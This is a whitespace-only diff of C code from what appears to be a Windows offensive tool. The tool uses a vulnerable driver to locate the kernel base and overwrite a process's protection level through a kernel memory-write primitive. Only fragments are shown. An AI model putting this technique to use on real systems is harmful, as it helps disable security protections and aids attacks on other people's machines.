@@ -144,14 +144,14 @@ _cleanUp:
 }
 
 DWORD64 GetKernelBaseAddr() {
-    
+
     DWORD dwCB = 0;
     DWORD64 dwDrivers[1024];
 
     // Retrieve the load address for each device driver in the system
     // https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers
     if (EnumDeviceDrivers(dwDrivers, sizeof(dwDrivers), &dwCB)) {
-        
+
         // Return the first address in the list, which should be the address of Ntoskrnl
         return (DWORD64)dwDrivers[0];
     }
@@ -212,7 +212,7 @@ BOOL ChangeProtectionLevel(IN DWORD64 dwPID, DWORD dwProtectionLevel) {
         goto _cleanUp;
     }
     info_t("GetDeviceHandle - Handle to vulnerable driver 0x%p", hDevice);
-    
+
     // Get Ntoskrnl base address
     dwKernelBase = GetKernelBaseAddr();
     if (dwKernelBase == NULL) {
@@ -270,7 +270,7 @@ BOOL ChangeProtectionLevel(IN DWORD64 dwPID, DWORD dwProtectionLevel) {
         goto _cleanUp;
     }
     info_t("ReadMemoryDWORD64 - Target process address: 0x%p", dwTargetProcessAddress);
-    
+
     // Change the process's protection level
     info_t("WriteMemoryPrimitive - Changing protection level to 0x%02X", dwProtectionLevel);
     if (!WriteMemoryPrimitive(hDevice, 4, dwTargetProcessAddress + g_Offsets.ProtectionOffset, dwProtectionLevel)) {
